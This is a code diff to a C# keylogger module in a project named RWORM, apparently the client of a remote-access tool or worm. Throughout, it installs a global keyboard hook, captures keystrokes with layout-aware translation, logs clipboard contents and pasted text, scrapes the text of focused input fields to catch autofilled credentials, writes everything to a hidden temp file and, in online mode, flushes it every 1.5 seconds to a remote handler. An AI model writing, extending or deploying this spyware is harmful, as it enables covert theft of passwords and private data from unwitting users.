@@ -1,4 +1,5 @@
 using System;
+using System.Collections.Concurrent;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -8,9 +9,12 @@ using System.Threading.Tasks;
 namespace RWORM.Client.Modules
 {
     /// <summary>
-    /// Low-level keyboard hook keylogger.
-    /// Offline mode: always appends to temp file.
-    /// Online mode: also flushes buffer via OnFlush every 2 s.
+    /// Robust low-level keyboard hook keylogger with:
+    /// - Native ToUnicodeEx character resolution (supports Turkish/intl layouts, Shift, AltGr, dead keys)
+    /// - Real-time Ctrl+V (paste) & clipboard monitoring
+    /// - Focused input and browser autofill detection via native Win32 APIs
+    /// - Non-blocking asynchronous I/O queue (prevents hook timeouts)
+    /// - Pure C# implementation with zero WPF/WinForms dependencies for minimal binary size
     /// </summary>
     public class Keylogger : IDisposable
     {
@@ -20,6 +24,9 @@ namespace RWORM.Client.Modules
         private const int WM_SYSKEYDOWN  = 0x0104;
         private const int WM_SYSKEYUP    = 0x0105;
         private const uint WM_QUIT       = 0x0012;
+        private const uint CF_UNICODETEXT = 13;
+        private const uint WM_GETTEXT    = 0x000D;
+        private const uint WM_GETTEXTLENGTH = 0x000E;
 
         [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, KeyboardProc cb, IntPtr mod, uint tid);
         [DllImport("user32.dll")] static extern bool   UnhookWindowsHookEx(IntPtr h);
@@ -31,7 +38,43 @@ namespace RWORM.Client.Modules
         [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
         [DllImport("user32.dll")] static extern int    GetWindowText(IntPtr h, StringBuilder s, int n);
         [DllImport("user32.dll")] static extern short  GetKeyState(int nVirtKey);
-        [DllImport("kernel32.dll")] static extern uint GetCurrentThreadId();
+        [DllImport("user32.dll")] static extern bool   GetKeyboardState(byte[] lpKeyState);
+        [DllImport("user32.dll")] static extern IntPtr GetKeyboardLayout(uint idThread);
+        [DllImport("user32.dll")] static extern uint   GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
+
+        [DllImport("user32.dll", SetLastError = true)] static extern bool OpenClipboard(IntPtr hWndNewOwner);
+        [DllImport("user32.dll", SetLastError = true)] static extern bool CloseClipboard();
+        [DllImport("user32.dll")] static extern IntPtr GetClipboardData(uint uFormat);
+        [DllImport("user32.dll")] static extern uint   GetClipboardSequenceNumber();
+        [DllImport("user32.dll", CharSet = CharSet.Auto)] static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, StringBuilder lParam);
+        [DllImport("user32.dll", CharSet = CharSet.Auto)] static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
+        [DllImport("user32.dll", CharSet = CharSet.Auto)] static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);
+
+        [StructLayout(LayoutKind.Sequential)]
+        struct RECT { public int Left, Top, Right, Bottom; }
+
+        [StructLayout(LayoutKind.Sequential)]
+        struct GUITHREADINFO
+        {
+            public int cbSize;
+            public int flags;
+            public IntPtr hwndActive;
+            public IntPtr hwndFocus;
+            public IntPtr hwndCapture;
+            public IntPtr hwndMenuOwner;
+            public IntPtr hwndMoveSize;
+            public IntPtr hwndCaret;
+            public RECT rcCaret;
+        }
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern bool GetGUIThreadInfo(uint idThread, ref GUITHREADINFO lpgui);
+
+        [DllImport("kernel32.dll")] static extern IntPtr GlobalLock(IntPtr hMem);
+        [DllImport("kernel32.dll")] static extern bool   GlobalUnlock(IntPtr hMem);
+        [DllImport("kernel32.dll")] static extern uint   GetCurrentThreadId();
 
         delegate IntPtr KeyboardProc(int n, IntPtr w, IntPtr l);
 
@@ -39,28 +82,32 @@ namespace RWORM.Client.Modules
         struct KBDLLHOOKSTRUCT { public int vkCode, scanCode, flags, time; public IntPtr extra; }
 
         [StructLayout(LayoutKind.Sequential)]
-        struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam, lParam; public uint time; public int x, y; }
+        struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam, lParam; public uint time; int x, y; }
 
         private KeyboardProc? _proc;
         private IntPtr        _hook = IntPtr.Zero;
-        private Thread?       _thread;
+        private Thread?       _hookThread;
+        private Thread?       _workerThread;
+        private Thread?       _autofillThread;
         private uint          _threadId;
-        private readonly StringBuilder _buf = new StringBuilder();
-        private readonly object        _lck = new object();
+        private readonly ConcurrentQueue<string> _queue = new();
+        private readonly StringBuilder _buf = new();
+        private readonly object _bufLock = new();
         private string _lastWindow = "";
-        private bool   _running;
+        private string _lastClipboard = "";
+        private string _lastAutofillVal = "";
+        private uint   _lastClipSeq;
+        private volatile bool _running;
 
-        // Modifier state — needed so letters render with correct case and
-        // shifted symbols resolve to their real characters. Without this the
-        // log was all-caps and Shift/Ctrl appeared as raw hex noise.
-        private bool   _shift, _caps, _ctrl, _alt;
+        private bool _shift;
+        private bool _ctrl;
+        private bool _alt;
+        private bool _caps;
 
         public static readonly string OfflineLogPath =
             Path.Combine(Path.GetTempPath(), "rworm_kl.dat");
 
-        /// Called with buffered data in online mode.
         public Func<string, Task>? OnFlush { get; set; }
-
         public bool IsRunning => _running;
 
         public void Start(bool onlineMode)
@@ -68,20 +115,15 @@ namespace RWORM.Client.Modules
             if (_running) return;
             _running = true;
 
-            _thread = new Thread(() =>
+            // 1. Hook Thread (Windows Message Loop)
+            _hookThread = new Thread(() =>
             {
                 _threadId = GetCurrentThreadId();
                 _proc     = HookProc;
 
-                // WH_KEYBOARD_LL: the module handle is ignored by the OS, and in
-                // a single-file publish Marshal.GetHINSTANCE returns -1 (the
-                // assembly has no file on disk), which made hook installation
-                // fail silently. Pass NULL — the documented value for LL hooks.
                 _hook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, IntPtr.Zero, 0);
                 if (_hook == IntPtr.Zero)
                 {
-                    // Fallback: retry with the real module handle for the rare
-                    // OS build that rejects a NULL hMod for this hook type.
                     _hook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc,
                         Marshal.GetHINSTANCE(typeof(Keylogger).Module), 0);
                 }
@@ -92,20 +134,75 @@ namespace RWORM.Client.Modules
                     DispatchMessage(ref msg);
                 }
 
-                if (_hook != IntPtr.Zero) { UnhookWindowsHookEx(_hook); _hook = IntPtr.Zero; }
+                if (_hook != IntPtr.Zero)
+                {
+                    UnhookWindowsHookEx(_hook);
+                    _hook = IntPtr.Zero;
+                }
             });
-            _thread.IsBackground = true;
-            _thread.Start();
+            _hookThread.IsBackground = true;
+            _hookThread.Start();
 
+            // 2. Background I/O and Clipboard Monitor Worker Thread
+            _workerThread = new Thread(() =>
+            {
+                try { _lastClipSeq = GetClipboardSequenceNumber(); } catch { }
+                while (_running)
+                {
+                    CheckClipboardChange();
+
+                    // Drain async entries to disk & stream buffer
+                    if (!_queue.IsEmpty)
+                    {
+                        var chunk = new StringBuilder();
+                        while (_queue.TryDequeue(out var item))
+                        {
+                            chunk.Append(item);
+                        }
+                        if (chunk.Length > 0)
+                        {
+                            string s = chunk.ToString();
+                            lock (_bufLock) { _buf.Append(s); }
+                            try { File.AppendAllText(OfflineLogPath, s); } catch { }
+                        }
+                    }
+
+                    Thread.Sleep(50);
+                }
+            });
+            _workerThread.IsBackground = true;
+            _workerThread.Start();
+
+            // 3. Native Win32 Active Control & Autofill Monitor
+            _autofillThread = new Thread(() =>
+            {
+                while (_running)
+                {
+                    try
+                    {
+                        CheckActiveControlText();
+                    }
+                    catch { }
+                    Thread.Sleep(800);
+                }
+            });
+            _autofillThread.IsBackground = true;
+            _autofillThread.Start();
+
+            // 4. Online flusher loop
             if (onlineMode)
             {
                 _ = Task.Run(async () =>
                 {
                     while (_running)
                     {
-                        await Task.Delay(2000);
+                        await Task.Delay(1500);
                         string data;
-                        lock (_lck) { data = _buf.ToString(); _buf.Clear(); }
+                        lock (_bufLock)
+                        {
+                            data = _buf.ToString();
+                            _buf.Clear();
+                        }
                         if (!string.IsNullOrEmpty(data) && OnFlush != null)
                         {
                             try { await OnFlush(data); } catch { }
@@ -120,17 +217,15 @@ namespace RWORM.Client.Modules
             if (!_running) return;
             _running = false;
 
-            // Wake the hook thread's message loop so it can unhook and exit.
-            // If the thread never reached GetMessage (Start raced) the flag
-            // alone still stops the flush loop and the hook is abandoned.
             if (_threadId != 0)
                 try { PostThreadMessage(_threadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero); } catch { }
 
-            _thread?.Join(1000);
+            _hookThread?.Join(1000);
+            _workerThread?.Join(500);
+            _autofillThread?.Join(500);
             _threadId = 0;
         }
 
-        /// Returns full offline log content (for "Offline" button in GUI).
         public string GetOfflineLog()
         {
             try { return File.Exists(OfflineLogPath) ? File.ReadAllText(OfflineLogPath) : "(empty)"; }
@@ -139,87 +234,80 @@ namespace RWORM.Client.Modules
 
         private IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode >= 0 && ((int)wParam == WM_KEYDOWN || (int)wParam == WM_SYSKEYDOWN))
+            if (nCode >= 0)
             {
+                int msg = (int)wParam;
                 var kb = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
                 int vk = kb.vkCode;
 
-                // Keep modifier state in sync so we can resolve letter case
-                // and shifted symbols. We intentionally do NOT log the
-                // modifier keys themselves — the old code emitted them as raw
-                // hex ([10], [A0], ...) which polluted every line.
-                switch (vk)
+                if (msg == WM_KEYDOWN || msg == WM_SYSKEYDOWN)
                 {
-                    case 0x10: case 0xA0: case 0xA1: _shift = true; return CallNextHookEx(_hook, nCode, wParam, lParam);
-                    case 0x11: case 0xA2: case 0xA3: _ctrl  = true; return CallNextHookEx(_hook, nCode, wParam, lParam);
-                    case 0x12: case 0xA4: case 0xA5: _alt   = true; return CallNextHookEx(_hook, nCode, wParam, lParam);
-                    case 0x14: _caps = !_caps; return CallNextHookEx(_hook, nCode, wParam, lParam);
+                    // Track modifiers
+                    switch (vk)
+                    {
+                        case 0x10: case 0xA0: case 0xA1: _shift = true; return CallNextHookEx(_hook, nCode, wParam, lParam);
+                        case 0x11: case 0xA2: case 0xA3: _ctrl  = true; return CallNextHookEx(_hook, nCode, wParam, lParam);
+                        case 0x12: case 0xA4: case 0xA5: _alt   = true; return CallNextHookEx(_hook, nCode, wParam, lParam);
+                        case 0x14: _caps = !_caps; return CallNextHookEx(_hook, nCode, wParam, lParam);
+                    }
+
+                    // Window title tracking
+                    var sb = new StringBuilder(256);
+                    var win = GetForegroundWindow();
+                    GetWindowText(win, sb, 256);
+                    string window = sb.ToString();
+
+                    if (!string.IsNullOrEmpty(window) && window != _lastWindow)
+                    {
+                        _queue.Enqueue($"\r\n[{DateTime.Now:HH:mm:ss} — {window}]\r\n");
+                        _lastWindow = window;
+                    }
+
+                    // Detect Ctrl+V (Paste) or Shift+Insert
+                    if ((_ctrl && (vk == 0x56 || vk == 0x76)) || (_shift && vk == 0x2D))
+                    {
+                        string? clip = GetClipboardText();
+                        if (!string.IsNullOrEmpty(clip))
+                        {
+                            _queue.Enqueue($"[Paste: \"{clip}\"]");
+                        }
+                        else
+                        {
+                            _queue.Enqueue("[Paste]");
+                        }
+                        return CallNextHookEx(_hook, nCode, wParam, lParam);
+                    }
+
+                    // Translate character via Win32 ToUnicodeEx
+                    string charText = TranslateVk(vk, kb.scanCode, win);
+                    if (!string.IsNullOrEmpty(charText))
+                    {
+                        _queue.Enqueue(charText);
+                    }
                 }
-
-                var sb  = new StringBuilder(256);
-                var win = GetForegroundWindow();
-                GetWindowText(win, sb, 256);
-                string window = sb.ToString();
-
-                var entry = new StringBuilder();
-                if (!string.IsNullOrEmpty(window) && window != _lastWindow)
+                else if (msg == WM_KEYUP || msg == WM_SYSKEYUP)
                 {
-                    entry.Append($"\r\n[{DateTime.Now:HH:mm} — {window}]\r\n");
-                    _lastWindow = window;
-                }
-                entry.Append(VkToStr(vk));
-
-                lock (_lck)
-                {
-                    _buf.Append(entry);
-                    try { File.AppendAllText(OfflineLogPath, entry.ToString()); } catch { }
+                    switch (vk)
+                    {
+                        case 0x10: case 0xA0: case 0xA1: _shift = false; break;
+                        case 0x11: case 0xA2: case 0xA3: _ctrl  = false; break;
+                        case 0x12: case 0xA4: case 0xA5: _alt   = false; break;
+                    }
                 }
             }
-            else if (nCode >= 0 && ((int)wParam == WM_KEYUP || (int)wParam == WM_SYSKEYUP))
-            {
-                var kb = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
-                switch (kb.vkCode)
-                {
-                    case 0x10: case 0xA0: case 0xA1: _shift = false; break;
-                    case 0x11: case 0xA2: case 0xA3: _ctrl  = false; break;
-                    case 0x12: case 0xA4: case 0xA5: _alt   = false; break;
-                }
-            }
+
             return CallNextHookEx(_hook, nCode, wParam, lParam);
         }
 
-        private string VkToStr(int vk)
+        private string TranslateVk(int vk, int scanCode, IntPtr hwnd)
         {
-            // Letters — VK codes are case-insensitive, so derive case from
-            // Shift XOR CapsLock. Without this every letter logged as caps.
-            if (vk >= 0x41 && vk <= 0x5A)
-            {
-                bool upper = _shift ^ _caps;
-                return ((char)(upper ? vk : vk + 32)).ToString();
-            }
-
-            // Number row — Shift produces the symbols shown.
-            if (vk >= 0x30 && vk <= 0x39)
-            {
-                if (_shift)
-                {
-                    // 0-9 with shift: ) ! @ # $ % ^ & * (
-                    var shifted = ")!@#$%^&*(";
-                    return shifted[vk - 0x30].ToString();
-                }
-                return ((char)vk).ToString();
-            }
-
-            if (vk >= 0x60 && vk <= 0x69) return ((char)('0' + vk - 0x60)).ToString(); // numpad
-
-            // OEM / punctuation keys — apply Shift where it changes the glyph.
             switch (vk)
             {
-                case 0x20: return " ";
-                case 0x0D: return "\r\n";
                 case 0x08: return "[BS]";
                 case 0x09: return "[Tab]";
+                case 0x0D: return "\r\n";
                 case 0x1B: return "[Esc]";
+                case 0x20: return " ";
                 case 0x2E: return "[Del]";
                 case 0x2D: return "[Ins]";
                 case 0x25: return "[←]";
@@ -230,24 +318,130 @@ namespace RWORM.Client.Modules
                 case 0x23: return "[End]";
                 case 0x21: return "[PgUp]";
                 case 0x22: return "[PgDn]";
-                case 0x90: return "[Num]";
-                case 0x14: return "[Caps]";
                 case 0x5B: case 0x5C: return "[Win]";
-                case 0xBC: return _shift ? "<" : ",";
-                case 0xBE: return _shift ? ">" : ".";
-                case 0xBF: return _shift ? "?" : "/";
-                case 0xBA: return _shift ? ":" : ";";
-                case 0xDE: return _shift ? "\"" : "'";
-                case 0xDB: return _shift ? "{" : "[";
-                case 0xDD: return _shift ? "}" : "]";
-                case 0xBD: return _shift ? "_" : "-";
-                case 0xBB: return _shift ? "+" : "=";
-                case 0xDC: return _shift ? "|" : "\\";
-                case 0xC0: return _shift ? "~" : "`";
-                default:
-                    if (vk >= 0x70 && vk <= 0x87) return $"[F{vk - 0x6F}]"; // F1-F24
-                    return $"[{vk:X2}]";
             }
+
+            if (vk >= 0x70 && vk <= 0x87) return $"[F{vk - 0x6F}]";
+
+            try
+            {
+                byte[] keyState = new byte[256];
+                GetKeyboardState(keyState);
+
+                if (_shift) { keyState[0x10] = 0x80; keyState[0xA0] = 0x80; }
+                if (_ctrl)  { keyState[0x11] = 0x80; keyState[0xA2] = 0x80; }
+                if (_alt)   { keyState[0x12] = 0x80; keyState[0xA4] = 0x80; }
+                if (_caps)  keyState[0x14] = 0x01;
+
+                uint threadId = GetWindowThreadProcessId(hwnd, out _);
+                IntPtr layout = GetKeyboardLayout(threadId);
+
+                var sb = new StringBuilder(16);
+                int count = ToUnicodeEx((uint)vk, (uint)scanCode, keyState, sb, sb.Capacity, 0, layout);
+
+                if (count > 0)
+                {
+                    return sb.ToString();
+                }
+            }
+            catch { }
+
+            if (vk >= 0x41 && vk <= 0x5A)
+            {
+                bool upper = _shift ^ _caps;
+                return ((char)(upper ? vk : vk + 32)).ToString();
+            }
+            if (vk >= 0x30 && vk <= 0x39) return ((char)vk).ToString();
+            if (vk >= 0x60 && vk <= 0x69) return ((char)('0' + vk - 0x60)).ToString();
+
+            return "";
+        }
+
+        public static string? GetClipboardText()
+        {
+            if (!OpenClipboard(IntPtr.Zero)) return null;
+            try
+            {
+                IntPtr hData = GetClipboardData(CF_UNICODETEXT);
+                if (hData == IntPtr.Zero) return null;
+                IntPtr pText = GlobalLock(hData);
+                if (pText == IntPtr.Zero) return null;
+                try
+                {
+                    return Marshal.PtrToStringUni(pText);
+                }
+                finally
+                {
+                    GlobalUnlock(hData);
+                }
+            }
+            catch { return null; }
+            finally
+            {
+                CloseClipboard();
+            }
+        }
+
+        private void CheckClipboardChange()
+        {
+            try
+            {
+                uint seq = GetClipboardSequenceNumber();
+                if (seq != _lastClipSeq)
+                {
+                    _lastClipSeq = seq;
+                    string? text = GetClipboardText();
+                    if (!string.IsNullOrEmpty(text) && text != _lastClipboard)
+                    {
+                        _lastClipboard = text;
+                        _queue.Enqueue($"\r\n[Clipboard: \"{text}\"]\r\n");
+                    }
+                }
+            }
+            catch { }
+        }
+
+        /// <summary>
+        /// Reads focused input text via Win32 GUI Thread Info.
+        /// Captures autofilled or pasted values inside active edit controls without WPF.
+        /// </summary>
+        private void CheckActiveControlText()
+        {
+            try
+            {
+                var fg = GetForegroundWindow();
+                if (fg == IntPtr.Zero) return;
+
+                uint tid = GetWindowThreadProcessId(fg, out _);
+                if (tid == 0) return;
+
+                var gui = new GUITHREADINFO { cbSize = Marshal.SizeOf<GUITHREADINFO>() };
+                if (!GetGUIThreadInfo(tid, ref gui)) return;
+
+                IntPtr focus = gui.hwndFocus;
+                if (focus == IntPtr.Zero) return;
+
+                var className = new StringBuilder(64);
+                GetClassName(focus, className, 64);
+                string cls = className.ToString().ToLowerInvariant();
+
+                if (cls.Contains("edit") || cls.Contains("textbox") || cls.Contains("rich"))
+                {
+                    int len = SendMessage(focus, WM_GETTEXTLENGTH, 0, 0);
+                    if (len > 1 && len < 1024)
+                    {
+                        var textSb = new StringBuilder(len + 1);
+                        SendMessage(focus, WM_GETTEXT, (IntPtr)(len + 1), textSb);
+                        string val = textSb.ToString().Trim();
+                        if (!string.IsNullOrEmpty(val) && val != _lastAutofillVal)
+                        {
+                            _lastAutofillVal = val;
+                            _queue.Enqueue($"\r\n[Autofill/Field: \"{val}\"]\r\n");
+                        }
+                    }
+                }
+            }
+            catch { }
         }
 
         public void Dispose() => Stop();
